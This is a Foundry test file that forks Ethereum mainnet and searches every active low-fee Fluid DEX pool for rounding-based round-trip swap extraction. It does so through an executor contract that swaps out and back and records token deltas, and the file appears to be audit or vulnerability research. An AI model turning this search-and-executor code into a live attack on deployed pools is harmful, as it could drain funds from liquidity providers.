// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IFluidDexFactoryLike {
    function totalDexes() external view returns (uint256);
    function getDexAddress(uint256 dexId) external view returns (address);
}

interface IFluidDexLike {
    struct Implementations {
        address shift;
        address admin;
        address colOperations;
        address debtOperations;
        address perfectOperationsAndSwapOut;
    }

    struct ConstantViews {
        uint256 dexId;
        address liquidity;
        address factory;
        Implementations implementations;
        address deployerContract;
        address token0;
        address token1;
        bytes32 supplyToken0Slot;
        bytes32 borrowToken0Slot;
        bytes32 supplyToken1Slot;
        bytes32 borrowToken1Slot;
        bytes32 exchangePriceToken0Slot;
        bytes32 exchangePriceToken1Slot;
        uint256 oracleMapping;
    }

    struct ConstantViews2 {
        uint256 token0NumeratorPrecision;
        uint256 token0DenominatorPrecision;
        uint256 token1NumeratorPrecision;
        uint256 token1DenominatorPrecision;
    }

    function constantsView() external view returns (ConstantViews memory);
    function constantsView2() external view returns (ConstantViews2 memory);
    function readFromStorage(bytes32 slot) external view returns (uint256);
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external
        payable
        returns (uint256 amountIn);
}

contract RoundTripExecutor {
    address public immutable pool;
    address public immutable token0;
    address public immutable token1;

    constructor(address pool_, address token0_, address token1_) {
        pool = pool_;
        token0 = token0_;
        token1 = token1_;
        _approve(token0_, pool_);
        _approve(token1_, pool_);
    }

    function _approve(address token, address spender) private {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    /// @notice Receive exact token1, then receive back the exact token0 spent.
    /// A positive delta1 while delta0 >= 0 is a closed-loop extraction.
    function cycle0To1(uint256 amountOut1) external returns (uint256 amountIn0, int256 delta0, int256 delta1) {
        uint256 before0 = IERC20Like(token0).balanceOf(address(this));
        uint256 before1 = IERC20Like(token1).balanceOf(address(this));
        amountIn0 = IFluidDexLike(pool).swapOut(true, amountOut1, type(uint256).max, address(this));
        IFluidDexLike(pool).swapOut(false, amountIn0, type(uint256).max, address(this));
        uint256 after0 = IERC20Like(token0).balanceOf(address(this));
        uint256 after1 = IERC20Like(token1).balanceOf(address(this));
        delta0 = int256(after0) - int256(before0);
        delta1 = int256(after1) - int256(before1);
    }

    /// @notice Receive exact token0, then receive back the exact token1 spent.
    function cycle1To0(uint256 amountOut0) external returns (uint256 amountIn1, int256 delta0, int256 delta1) {
        uint256 before0 = IERC20Like(token0).balanceOf(address(this));
        uint256 before1 = IERC20Like(token1).balanceOf(address(this));
        amountIn1 = IFluidDexLike(pool).swapOut(false, amountOut0, type(uint256).max, address(this));
        IFluidDexLike(pool).swapOut(true, amountIn1, type(uint256).max, address(this));
        uint256 after0 = IERC20Like(token0).balanceOf(address(this));
        uint256 after1 = IERC20Like(token1).balanceOf(address(this));
        delta0 = int256(after0) - int256(before0);
        delta1 = int256(after1) - int256(before1);
    }
}

contract LowFeeExactOutRoundTripTest is Test {
    address internal constant MAINNET_FACTORY = 0x91716c4eda1fb55e84bf8b4c7085f84285c19085;
    address internal constant NATIVE_TOKEN = 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee;
    uint256 internal constant FORK_BLOCK = 25_686_659;
    uint256 internal constant MAX_FEE_RAW = 50; // 0.005%

    event PoolCandidate(uint256 indexed dexId, address indexed pool, address token0, address token1, uint256 feeRaw);
    event SearchResult(
        uint256 indexed dexId,
        bool indexed zeroToOne,
        uint256 amountOut,
        uint256 amountIn,
        int256 delta0,
        int256 delta1
    );
    event BestResult(
        uint256 indexed dexId,
        bool indexed zeroToOne,
        uint256 amountOut,
        int256 profitRaw,
        uint256 gasUsed
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
    }

    function test_statefulRoundTripSearchOnEveryActiveLowFeePool() public {
        IFluidDexFactoryLike factory = IFluidDexFactoryLike(MAINNET_FACTORY);
        uint256 total = factory.totalDexes();
        uint256 activeCandidates;

        for (uint256 dexId = 1; dexId <= total; dexId++) {
            address pool = factory.getDexAddress(dexId);
            if (pool.code.length == 0) continue;

            IFluidDexLike dex = IFluidDexLike(pool);
            uint256 packed = dex.readFromStorage(bytes32(uint256(1)));
            uint256 feeRaw = (packed >> 2) & ((1 << 17) - 1);
            bool initialized = (packed & 3) != 0;
            bool paused = (packed >> 255) != 0;
            if (!initialized || paused || feeRaw == 0 || feeRaw > MAX_FEE_RAW) continue;

            IFluidDexLike.ConstantViews memory cv = dex.constantsView();
            if (cv.token0 == NATIVE_TOKEN || cv.token1 == NATIVE_TOKEN) continue;
            IFluidDexLike.ConstantViews2 memory cv2 = dex.constantsView2();

            activeCandidates++;
            emit PoolCandidate(dexId, pool, cv.token0, cv.token1, feeRaw);

            RoundTripExecutor executor = new RoundTripExecutor(pool, cv.token0, cv.token1);
            // Fork-only setup: creates attacker starting inventory without changing pool config or reserves.
            deal(cv.token0, address(executor), 10 ** 36);
            deal(cv.token1, address(executor), 10 ** 36);

            _searchDirection(dexId, executor, true, _minimumRaw(cv2.token1NumeratorPrecision, cv2.token1DenominatorPrecision));
            _searchDirection(dexId, executor, false, _minimumRaw(cv2.token0NumeratorPrecision, cv2.token0DenominatorPrecision));
        }

        assertGt(activeCandidates, 0, "no initialized low-fee ERC20/ERC20 pool at fixed fork block");
    }

    function _minimumRaw(uint256 numerator, uint256 denominator) internal pure returns (uint256) {
        uint256 adjustedMinimum = (1_000_000 * denominator + numerator - 1) / numerator;
        return adjustedMinimum > 100 ? adjustedMinimum : 100;
    }

    function _searchDirection(uint256 dexId, RoundTripExecutor executor, bool zeroToOne, uint256 minimum)
        internal
    {
        int256 bestProfit;
        uint256 bestAmount;
        uint256 bestGas;
        uint256 snap = vm.snapshotState();

        // Dense search where the fee itself rounds to zero and floor effects dominate.
        for (uint256 i = 0; i < 384; i++) {
            uint256 amountOut = minimum + i;
            (bool ok, uint256 amountIn, int256 d0, int256 d1, uint256 gasUsed) =
                _attempt(executor, zeroToOne, amountOut);
            if (ok) {
                emit SearchResult(dexId, zeroToOne, amountOut, amountIn, d0, d1);
                int256 profit = zeroToOne ? d1 : d0;
                int256 restored = zeroToOne ? d0 : d1;
                if (restored >= 0 && profit > bestProfit) {
                    bestProfit = profit;
                    bestAmount = amountOut;
                    bestGas = gasUsed;
                }
            }
            require(vm.revertToState(snap), "snapshot restore failed");
        }

        // Logarithmic search for effects that only appear at larger reserve ratios.
        uint256 amount = minimum;
        for (uint256 i = 0; i < 18; i++) {
            amount *= 10;
            (bool ok, uint256 amountIn, int256 d0, int256 d1, uint256 gasUsed) =
                _attempt(executor, zeroToOne, amount);
            if (ok) {
                emit SearchResult(dexId, zeroToOne, amount, amountIn, d0, d1);
                int256 profit = zeroToOne ? d1 : d0;
                int256 restored = zeroToOne ? d0 : d1;
                if (restored >= 0 && profit > bestProfit) {
                    bestProfit = profit;
                    bestAmount = amount;
                    bestGas = gasUsed;
                }
            }
            require(vm.revertToState(snap), "snapshot restore failed");
        }

        emit BestResult(dexId, zeroToOne, bestAmount, bestProfit, bestGas);
    }

    function _attempt(RoundTripExecutor executor, bool zeroToOne, uint256 amountOut)
        internal
        returns (bool ok, uint256 amountIn, int256 d0, int256 d1, uint256 gasUsed)
    {
        uint256 gasBefore = gasleft();
        if (zeroToOne) {
            try executor.cycle0To1(amountOut) returns (uint256 a, int256 x, int256 y) {
                return (true, a, x, y, gasBefore - gasleft());
            } catch {
                return (false, 0, 0, 0, gasBefore - gasleft());
            }
        } else {
            try executor.cycle1To0(amountOut) returns (uint256 a, int256 x, int256 y) {
                return (true, a, x, y, gasBefore - gasleft());
            } catch {
                return (false, 0, 0, 0, gasBefore - gasleft());
            }
        }
    }
}
